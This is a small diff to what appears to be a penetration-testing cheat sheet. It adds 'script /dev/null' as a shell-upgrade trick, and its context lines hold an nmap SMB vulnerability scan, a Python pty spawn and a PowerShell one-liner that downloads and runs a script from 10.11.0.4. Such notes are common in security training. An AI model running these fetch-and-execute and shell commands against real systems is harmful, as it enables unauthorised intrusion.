@@ -18,6 +18,7 @@ nmap -v -p 139,445 --script=smb-vuln-* "$target"
 
 # Upgrading Shell (pty)
 python -c 'import pty; pty.spawn("/bin/bash")'
+script /dev/null
 
 # Powershell
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
